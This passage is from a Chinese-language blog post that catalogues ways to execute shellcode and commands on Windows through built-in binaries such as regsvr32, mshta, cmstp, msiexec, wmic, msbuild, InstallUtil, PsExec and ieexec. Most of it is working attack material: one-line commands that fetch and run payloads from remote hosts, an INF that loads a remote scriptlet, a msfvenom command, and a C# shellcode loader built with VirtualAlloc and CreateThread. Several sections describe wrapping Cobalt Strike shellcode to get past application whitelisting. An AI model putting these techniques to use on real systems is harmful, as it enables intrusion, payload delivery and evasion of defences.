-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xx.xxx.xx.xxx:8011&#x2F;test.sct scrobj.dll</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155737189.png" alt="image-20200807155737189"></p>
-<h3 id="MSHTA"><a href="#MSHTA" class="headerlink" title="MSHTA"></a>MSHTA</h3><p><strong>什么是MSHTA?</strong></p>
-<p> mshta是一个可以用来执行hta文件的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
-
-<p> hta文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot; </span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806202058071.png" alt="image-20200806202058071"></p>
-<h3 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h3><p> 控制面板就不用多讲了，直接看如何通过control去执行命令，首先将如下的内容编译为dll</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">WinExec(&quot;cmd.exe &#x2F;c calc&quot;, SW_SHOW);</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 将生成的dll文件重命名为cpl，通过下面的命令执行cpl文件，加载cpl文件需要使用绝对路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">control.exe c:\xxxx\xxxxxxx\xxxxx.cpl</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806203405876.png" alt="image-20200806203405876"></p>
-<p> 也可以通过其他的方式加载执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL  C:\xx\xxxx\xxx\Dll4.cpl</span><br><span class="line">rundll32.exe shell32.dll,Control_RunDLLAsUser C:\Users\jerry\Desktop\Dll4.cpl</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200806210718338.png" alt="image-20200806210718338"></p>
-<h3 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h3><p> CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。它接受INF文件，这些文件可以通过恶意命令武器化，以脚本（SCT）和DLL的形式执行任意代码。</p>
-<p><strong>如何使用cmstp执行sct脚本?</strong></p>
-<p> 首先将我们准备好的sct文件上传到web上，再编写inf文件去加载远程的sct文件，inf文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature&#x3D;$chicago$</span><br><span class="line">AdvancedINF&#x3D;2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs&#x3D;UnRegisterOCXSection</span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line">%11%\scrobj.dll,NI,http:&#x2F;&#x2F;10.0.0.2&#x2F;tmp&#x2F;powersct.sct</span><br><span class="line">[Strings]</span><br><span class="line">AppAct &#x3D; &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName&#x3D;&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName&#x3D;&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
-
-<p> 使用cmst调用inf脚本加载远程sct文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe &#x2F;s xxx.inf</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807163918589.png" alt="image-20200807163918589"></p>
-<h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><p><strong>msiexec是什么？</strong></p>
-<p> msiexec是一个windows系统自带的命令，可以用来安装Windows Installer安装包（MSI）</p>
-<p><strong>如何制作msi文件？</strong></p>
-<p> 我们知道msiexec只能执行msi文件，所以我们有必要了解msi文件该如何制作</p>
-<p> 首先可以使用msf制作msi</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;exec CMD&#x3D;cmd.exe -f msi &gt; cmd.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154506118.png" alt="image-20200807154506118"></p>
-<p> 使用Advanced Installer制作msi文件，首先创建一个工程，创建好以后界面如下：</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160241692.png" alt="image-20200807160241692"></p>
-<p> 找到用户自定义行为，加载文件，配置加载cmd文件</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807160620661.png" alt="image-20200807160620661"></p>
-<p> 还需要在生成的时候进行设置，设置后build即可生成一个msi文件</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162456780.png" alt="image-20200807162456780"></p>
-<p> 安装后我们的命令就会被执行</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807162547512.png" alt="image-20200807162547512"></p>
-<p><strong>如何使用msiexec执行？</strong></p>
-<p>方法一：直接双击执行</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154634996.png" alt="image-20200807154634996"></p>
-<p>方法二： 加载本地文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec  &#x2F;q   &#x2F;i test.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807154717522.png" alt="image-20200807154717522"></p>
-<p>方法三：远程加载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.0.107&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807155239472.png" alt="image-20200807155239472"></p>
-<h3 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h3><p> forfiles可以选择文件并在其上运行命令。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m notepad.exe &#x2F;c calc.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807165115936.png" alt="image-20200807165115936"></p>
-<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p> 首先准备一个xsl文件，文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 将这个文件上传到web服务器上，再通过下面的命令加载执行,地址那需要加双引号，否则会有异常</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process get brief &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.0.107:8080&#x2F;launcher.xsl&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807171443469.png" alt="image-20200807171443469"></p>
-<h3 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h3><p> msxsl虽然可以加载远程的文件执行，但是它不是windows自带的，需要去下载，好在这个文件本身也不大，就20k的样子，可以直接传给目标主机。</p>
-<p> 通过如下方式执行xsl</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.xsl  http:&#x2F;&#x2F;xx.xxx.xx.xx:8011&#x2F;test.xsl</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807172754499.png" alt="image-20200807172754499"></p>
-<h3 id="msbuild"><a href="#msbuild" class="headerlink" title="msbuild"></a>msbuild</h3><p> 使用msbuild可以编译xml c#的项目文件，msbuild.exe并不在windows的环境变量中，因此需要绝对路径进行加载。</p>
-<p><strong>如何使用msbuild执行？</strong></p>
-<p> 首先我们准备一个xml的<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml" target="_blank" rel="noopener">模板</a>,下载好后使用cs生成一个c#的shellcode，对xml中执行shellcode部分的内容进行替换，使用如下命令加载xml文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807175852058.png" alt="image-20200807175852058"></p>
-<h3 id="CSC-Installutil"><a href="#CSC-Installutil" class="headerlink" title="CSC+Installutil"></a>CSC+Installutil</h3><p> csc是一个C#的命令行编译工具，可以用来编译.cs文件。</p>
-<p> Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。</p>
-<p><strong>如何利用？</strong></p>
-<p> 首先使用CS生成一个c#的shellcode，将生成的shellcode文件插入到<a href="https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260" target="_blank" rel="noopener">InstallUtil-Shellcode-cs</a>这个模板中，使用如下命令进行编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:C:\Users\admin\Desktop\xxxx\SharpCat.exe  &#x2F;unsafe C:\Users\admin\Desktop\xxx\InstallUtil-Shellcode.cs</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170200605.png" alt="image-20200810170200605"></p>
-<p> 将生成的exe上传到目标主机，使用如下命令进行加载执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U SharpCat.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170509058.png" alt="image-20200810170509058"></p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170531338.png" alt="image-20200810170531338"></p>
-<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p> 微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula -d -s msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxx:999&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810171425659.png" alt="image-20200810171425659"></p>
-<h3 id="WSC"><a href="#WSC" class="headerlink" title="WSC"></a>WSC</h3><p><strong>什么是WSC？</strong></p>
-<p> Windows Script Components (WSC)，以前称为Scriplets，是一种以容易的方式开发强大的COM组件的技术。 WSC可以用任何实现了ActiveX脚本接口的脚本语言来编写，这意味着PerlScript代码单元可以封装为Windows脚本组件。</p>
-<p><strong>怎么使用WSC执行命令？</strong></p>
-<p> 首先我们创建一个wsc文件，文件内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 再创建一个js文件，文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:C:\\Users\\jerry\\Desktop\\test666.wsc&quot;);</span><br></pre></td></tr></table></figure>
-
-<p> 最后通过csript 1.js执行命令</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200804170202844.png" alt="image-20200804170202844"></p>
-<p> 也可以将WSC文件挂载到远程，修改1.js中的内容,也可以执行命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxx.xxx.xx.xx:xxx&#x2F;test666&quot;);</span><br></pre></td></tr></table></figure>
-
-<h3 id="IEExec（利用失败）"><a href="#IEExec（利用失败）" class="headerlink" title="IEExec（利用失败）"></a>IEExec（利用失败）</h3><p> IEExec是一个Microsoft二进制文件，它是.NET Framework（v2.0.50727）的一部分，并且能够通过指定URL运行在远程目标上托管的应用程序。由于IEExec是Microsoft受信任的实用程序，因此攻击者可以绕过AppLocker和其他应用程序白名单解决方案来运行可执行文件。</p>
-<p> 使用这种方式首先要禁用代码访问策略，允许执行.net代码,使用管理员权限运行如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\CasPol.exe  -s off</span><br></pre></td></tr></table></figure>
-
-<p> CasPol.exe文件在有些win10中和win2012中没有在v2.2.50727目录下，在v4.0.30319目录下，但是这个里面的CasPol没有-s参数。</p>
-<p> 使用CS生成一个C#的shellcode并放到如下的执行模板中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace testIEexec</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">        private static UInt32 MEM_RELEASE &#x3D; 0x8000;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 替换下面数组中的内容</span><br><span class="line">            byte[] proc &#x3D; new byte[894] &#123; 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00,............. &#125;;</span><br><span class="line">            UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length);</span><br><span class="line">            IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">            UInt32 threadId &#x3D; 0;</span><br><span class="line">            &#x2F;&#x2F; prepare data </span><br><span class="line">            PROCESSOR_INFO info &#x3D; new PROCESSOR_INFO();</span><br><span class="line">            IntPtr pinfo &#x3D; Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));</span><br><span class="line">            Marshal.StructureToPtr(info, pinfo, false);</span><br><span class="line">            &#x2F;&#x2F; execute native code </span><br><span class="line">            hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#x2F;&#x2F; retrive data </span><br><span class="line">            info &#x3D; (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO));</span><br><span class="line">            Marshal.FreeHGlobal(pinfo);</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr GetModuleHandle(string moduleName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 LoadLibrary(string lpFileName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">        [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">        internal struct PROCESSOR_INFO</span><br><span class="line">        &#123;</span><br><span class="line">            public UInt32 dwMax;</span><br><span class="line">            public UInt32 id0;</span><br><span class="line">            public UInt32 id1;</span><br><span class="line">            public UInt32 id2;</span><br><span class="line">            public UInt32 dwStandard;</span><br><span class="line">            public UInt32 dwFeature;</span><br><span class="line">            &#x2F;&#x2F; if AMD </span><br><span class="line">            public UInt32 dwExt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 将该文件编译为exe，并且放到web上，使用如下命令进行加载</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http:&#x2F;&#x2F;xxx.xxx.xx.xx:803&#x2F;test.exe</span><br></pre></td></tr></table></figure>
-
-<p> 这里我测试虽然请求了远程的地址，但是并没有上线，原因未知，这种方式比较鸡肋，因为我在其他的windows10和2012中没有找到ieexec.exe这个文件。</p>
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810140930599.png" alt="image-20200810140930599"></p>
-<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p> Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p>
-<p> 可以使用下面的方式执行本地exe文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL calc.exe</span><br><span class="line">rundll32.exe url.dll,FileProtocolHandler calc.exe</span><br><span class="line">rundll32.exe zipfldr.dll, RouteTheCall calc.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810142457880.png" alt="image-20200810142457880"></p>
-<p> 除了直接加载exe，也可以通过如下方式加载。</p>
-<p> 首先编写一个.url文件，文件内容如下：</p>
